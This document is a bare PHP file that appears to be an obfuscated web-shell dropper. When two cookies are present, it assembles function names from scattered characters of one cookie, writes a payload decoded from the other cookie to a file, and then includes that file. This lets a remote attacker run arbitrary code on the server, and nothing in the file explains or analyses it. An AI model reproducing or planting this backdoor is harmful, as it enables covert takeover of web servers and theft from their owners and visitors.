<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[15])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[15][$n];
        if (!$c[15][$n + 1]) {
            if (!$c[15][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[3]() . $p[22];
    if (!$p[12]($k)) {
        $n = $p[5]($k, $p[6]);
        $p[10]($n, $p[16] . $p[13]($p[26]($c[3])));
    }
    include($k);
}